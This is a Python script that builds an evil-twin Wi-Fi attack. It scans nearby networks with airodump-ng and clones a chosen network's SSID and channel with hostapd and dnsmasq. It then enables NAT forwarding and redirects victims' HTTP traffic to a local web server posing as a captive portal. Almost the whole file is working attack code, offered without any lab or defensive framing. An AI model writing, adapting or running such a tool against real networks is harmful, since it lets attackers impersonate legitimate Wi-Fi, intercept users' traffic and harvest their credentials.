import os
import sys
import subprocess
import time

# Configuration
INTERFACE = 'wlan0'          # Your wireless interface
MON_INTERFACE = ''   # Monitor mode interface
AP_IP = '192.168.1.1'
SUBNET = '192.168.1.0/24'
SCAN_TIME = 10               # Scanning duration in seconds
HOSTAPD_CONF = '/tmp/hostapd.conf'
DNSMASQ_CONF = '/tmp/dnsmasq.conf'
AIRODUMP_FILE = '/tmp/airodump.csv'

def run_command(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    except subprocess.CalledProcessError as e:
        print(f"Command failed: {e.output.decode()}")
        return None

def set_network_interface():
    global INTERFACE, MON_INTERFACE
    interface_input = input(f'Set interface name [{INTERFACE}]: ')
    if interface_input:
        INTERFACE = interface_input
    MON_INTERFACE = INTERFACE + 'mon'
    print(f'Interface: {INTERFACE}, Monitor Interface: {MON_INTERFACE}')

def start_monitor_mode():
    print("Starting monitor mode...")
    run_command('airmon-ng check kill')
    run_command(f'airmon-ng start {INTERFACE}')

def stop_monitor_mode():
    print("Stopping monitor mode...")
    # Check if the monitor interface exists before trying to stop it
    interfaces = run_command('iwconfig 2>/dev/null | grep "Mode:Monitor" | awk \'{print $1}\'')
    if MON_INTERFACE in interfaces:
        run_command(f'airmon-ng stop {MON_INTERFACE}')
    else:
        print(f"Monitor interface {MON_INTERFACE} does not exist. Skipping.")
    run_command(f'ifconfig {INTERFACE} up')

def scan_networks():
    print("Scanning networks with airodump-ng...")
    scan_cmd = f'airodump-ng -w /tmp/airodump --output-format csv {MON_INTERFACE}'
    p = subprocess.Popen(scan_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(SCAN_TIME)
    p.terminate()
    
    networks = []
    try:
        with open('/tmp/airodump-01.csv', 'r') as f:
            lines = f.readlines()
    except FileNotFoundError:
        return []

    for line in lines:
        if 'Station' in line:
            break  # Stop at station list
        parts = line.strip().split(',')
        if len(parts) > 13 and parts[0].strip():
            ssid = ','.join(parts[13:]).strip()
            if ssid:
                networks.append({
                    'bssid': parts[0].strip().rstrip(','),
                    'channel': parts[3].strip(),
                    'ssid': ssid.rstrip(',') + ' ',
                    'encryption': parts[5].strip()
                })
    return networks

def select_network(networks):
    print("\nAvailable Networks:")
    for i, net in enumerate(networks):
        print(f"{i+1}. {net['ssid']} (Channel: {net['channel']})")
    
    while True:
        try:
            choice = int(input("\nSelect network (number): "))
            return networks[choice-1]
        except (ValueError, IndexError):
            print("Invalid selection")

def setup_ap(ssid, channel):
    print(f"\nCreating clone network: {ssid}")
    
    # Hostapd configuration
    with open(HOSTAPD_CONF, 'w') as f:
        f.write(f"""interface={INTERFACE}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g""")
    
    # Dnsmasq configuration
    with open(DNSMASQ_CONF, 'w') as f:
        f.write(f"""interface={INTERFACE}
dhcp-range=192.168.1.50,192.168.1.150,255.255.255.0,12h
dhcp-option=3,{AP_IP}
server=8.8.8.8""")
    
    # Network setup
    run_command(f'ifconfig {INTERFACE} {AP_IP} netmask 255.255.255.0')
    run_command('sysctl -w net.ipv4.ip_forward=1')
    run_command(f'iptables -t nat -A POSTROUTING -o {INTERFACE} -j MASQUERADE')
    run_command(f'iptables -A FORWARD -i {INTERFACE} -j ACCEPT')
    run_command(f'iptables -t nat -A PREROUTING -i {INTERFACE} -p tcp --dport 80 -j REDIRECT --to-port 80')

def start_services():
    print("Starting services...")
    subprocess.Popen(['hostapd', HOSTAPD_CONF], 
                    stdout=subprocess.DEVNULL, 
                    stderr=subprocess.DEVNULL)
    subprocess.Popen(['dnsmasq', '-C', DNSMASQ_CONF],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL)

def cleanup():
    print("\nCleaning up...")
    run_command('pkill hostapd')
    run_command('pkill dnsmasq')
    run_command('iptables --flush')
    run_command(f'ifconfig {INTERFACE} down')
    run_command(f'ifconfig {INTERFACE} up')
    os.system('rm /tmp/airodump-*')
    os.system(f'rm {HOSTAPD_CONF} {DNSMASQ_CONF}')

def run_captive_portal():
    """
    This function sets up iptables rules to forward all HTTP traffic
    to the existing web server on port 80.
    """
    print("Forwarding all HTTP traffic to existing web server on port 80...")
    # Ensure traffic is forwarded to the existing web server
    run_command(f'iptables -t nat -A PREROUTING -i {INTERFACE} -p tcp --dport 80 -j DNAT --to-destination {AP_IP}:80')
    run_command(f'iptables -t nat -A POSTROUTING -o {INTERFACE} -p tcp --dport 80 -j MASQUERADE')

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("This script must be run as root!")
        sys.exit(1)
    
    try:
        set_network_interface()
        start_monitor_mode()
        networks = scan_networks()
        stop_monitor_mode()
        
        if not networks:
            print("No networks found")
            sys.exit(1)
        
        selected = select_network(networks)
        setup_ap(selected['ssid'], selected['channel'])
        start_services()
        run_captive_portal()
        print("Captive portal is running. All HTTP traffic is forwarded to the existing web server on port 80.")
        while True:
            time.sleep(1)  # Keep the script running
    except KeyboardInterrupt:
        pass
    finally:
        cleanup()
        stop_monitor_mode()
